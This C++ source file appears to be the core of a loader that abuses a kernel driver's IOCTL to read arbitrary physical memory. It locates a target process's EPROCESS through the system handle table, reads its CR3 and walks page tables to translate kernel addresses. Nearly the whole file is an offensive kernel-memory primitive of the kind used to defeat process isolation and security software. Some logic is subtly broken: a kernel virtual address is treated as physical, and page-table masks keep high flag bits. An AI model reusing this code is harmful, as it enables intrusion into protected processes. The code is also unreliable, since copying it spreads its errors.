#include "includes.h"
#include "loader.h"


#define IOCTL_READ_PHYSICAL_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

void vul::test() {

	GetCurrentProcess();

}

// Wrapper to read physical memory using your driver
bool vul::ReadPhysicalMemory( HANDLE hDevice, UINT64 physAddr, void* buffer, size_t size ) {
	struct {
		UINT64 PhysicalAddress;
		UINT64 Size;
	} input = { physAddr, size };

	DWORD bytesReturned = 0;
	return DeviceIoControl( hDevice, IOCTL_READ_PHYSICAL_MEMORY,
		&input, sizeof( input ),
		buffer, ( DWORD )size,
		&bytesReturned, nullptr ) && bytesReturned == size;
}

// Helper: Find EPROCESS physical address for given PID
// Strategy: enumerate handles for system process (PID 4), find EPROCESS object whose PID field == target PID
UINT64 vul::GetEProcessPhysicalAddress( HANDLE hDevice, int targetPid ) {
    ULONG bufferLength = 0;
    ULONG returnLength = 0;

    // Step 1: Query SystemExtendedHandleInformation (0x40) for handle list size
    NTSTATUS status = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )0x40, nullptr, 0, &returnLength );
    if ( status != 0xC0000004 /*STATUS_INFO_LENGTH_MISMATCH*/ ) {
        std::cerr << "[-] NtQuerySystemInformation failed to get size: 0x" << std::hex << status << "\n";
        return 0;
    }

    bufferLength = returnLength;
    std::vector<BYTE> buffer( bufferLength );

    // Step 2: Get the handle information
    status = NtQuerySystemInformation( (SYSTEM_INFORMATION_CLASS)0x40, buffer.data(), bufferLength, &returnLength );
    if ( status != 0 ) {
        std::cerr << "[-] NtQuerySystemInformation failed to get handle info: 0x" << std::hex << status << "\n";
        return 0;
    }

    auto handleInfo = reinterpret_cast< SYSTEM_HANDLE_INFORMATION_EX* >( buffer.data() );

    // Iterate all handles, find handles owned by system process (PID 4) that point to EPROCESS
    // HandleAttributes and ObjectTypeIndex checks may be optional
    for ( ULONG i = 0; i < handleInfo->NumberOfHandles; i++ ) {
        auto& entry = handleInfo->Handles[i];

        if ( entry.UniqueProcessId == 4 /*System PID*/ ) {
            UINT64 eprocessPhys = reinterpret_cast< UINT64 >( entry.Object );

            // Read PID field from EPROCESS to check if it matches targetPid
            int pidInEprocess = 0;
            // Offset of PID in EPROCESS varies: 0x440 is common on Windows 10 22H2 x64, verify for your OS
            if ( !ReadPhysicalMemory( hDevice, eprocessPhys + 0x440, &pidInEprocess, sizeof( pidInEprocess ) ) ) {
                continue;
            }

            if ( pidInEprocess == targetPid ) {
                std::cout << "[+] Found EPROCESS for PID " << targetPid << " at physical 0x" << std::hex << eprocessPhys << "\n";
                return eprocessPhys;
            }
        }
    }

    std::cerr << "[-] Could not find EPROCESS for PID " << targetPid << "\n";
    return 0;
}

// Read DirectoryTableBase (CR3) from EPROCESS physical address
UINT64 GetCr3FromEprocess( HANDLE hDevice, UINT64 eprocessPhys ) {
    UINT64 cr3 = 0;
    // Offset of DirectoryTableBase in EPROCESS (commonly 0x28)
    const UINT64 DirectoryTableBaseOffset = 0x28;

    if ( !vul::ReadPhysicalMemory( hDevice, eprocessPhys + DirectoryTableBaseOffset, &cr3, sizeof( cr3 ) ) ) {
        std::cerr << "[-] Failed to read DirectoryTableBase from EPROCESS physical memory\n";
        return 0;
    }

    if ( ( cr3 & 0xFFF ) != 0 ) {
        std::cerr << "[-] Invalid CR3 value read: 0x" << std::hex << cr3 << "\n";
        return 0;
    }

    return cr3;
}

// Helper to read 8 bytes from physical memory
bool ReadPhys64( HANDLE hDevice, UINT64 physAddr, UINT64* outVal ) {
    return vul::ReadPhysicalMemory( hDevice, physAddr, outVal, sizeof( UINT64 ) );
}

// Translate Kernel VA to physical address via page tables and CR3
UINT64 TranslateVaToPa( HANDLE hDevice, UINT64 cr3, UINT64 va ) {
    const UINT64 PAGE_SIZE = 0x1000;
    const UINT64 PAGE_MASK = ~( PAGE_SIZE - 1 );

    // Extract PML4, PDPT, PD, PT indexes from VA (x64 Windows 4-level paging)
    UINT64 pml4Index = ( va >> 39 ) & 0x1FF;
    UINT64 pdptIndex = ( va >> 30 ) & 0x1FF;
    UINT64 pdIndex = ( va >> 21 ) & 0x1FF;
    UINT64 ptIndex = ( va >> 12 ) & 0x1FF;
    UINT64 pageOffset = va & 0xFFF;

    UINT64 physAddr = 0;
    UINT64 entry = 0;

    // Helper to read page table entry physical address (each entry 8 bytes)
    auto readEntry = [&]( UINT64 tablePhys, UINT64 index ) -> UINT64 {
        UINT64 entryVal = 0;
        if ( !ReadPhys64( hDevice, tablePhys + index * 8, &entryVal ) ) {
            std::cerr << "[-] Failed to read page table entry at 0x" << std::hex << tablePhys + index * 8 << "\n";
            return 0;
        }
        return entryVal;
    };

    // 1) Read PML4 entry
    UINT64 pml4Phys = cr3 & PAGE_MASK;
    entry = readEntry( pml4Phys, pml4Index );
    if ( !( entry & 1 ) ) { std::cerr << "[-] Invalid PML4 entry\n"; return 0; }
    // Mask to get PDPT physical base addr (bit 51..12)
    UINT64 pdptPhys = entry & PAGE_MASK;

    // 2) Read PDPT entry
    entry = readEntry( pdptPhys, pdptIndex );
    if ( !( entry & 1 ) ) { std::cerr << "[-] Invalid PDPT entry\n"; return 0; }
    // Check if this is a large page (1 GB page)
    if ( entry & ( 1ULL << 7 ) ) {
        // 1 GB page - physical address is entry base + offset in 1GB page
        return ( entry & 0xFFFFFC0000000ULL ) + ( va & 0x3FFFFFFF );
    }
    UINT64 pdPhys = entry & PAGE_MASK;

    // 3) Read PD entry
    entry = readEntry( pdPhys, pdIndex );
    if ( !( entry & 1 ) ) { std::cerr << "[-] Invalid PD entry\n"; return 0; }
    // Check if large page (2 MB)
    if ( entry & ( 1ULL << 7 ) ) {
        return ( entry & 0xFFFFFFFE00000ULL ) + ( va & 0x1FFFFF );
    }
    UINT64 ptPhys = entry & PAGE_MASK;

    // 4) Read PT entry
    entry = readEntry( ptPhys, ptIndex );
    if ( !( entry & 1 ) ) { std::cerr << "[-] Invalid PT entry\n"; return 0; }

    physAddr = ( entry & PAGE_MASK ) + pageOffset;
    return physAddr;
}
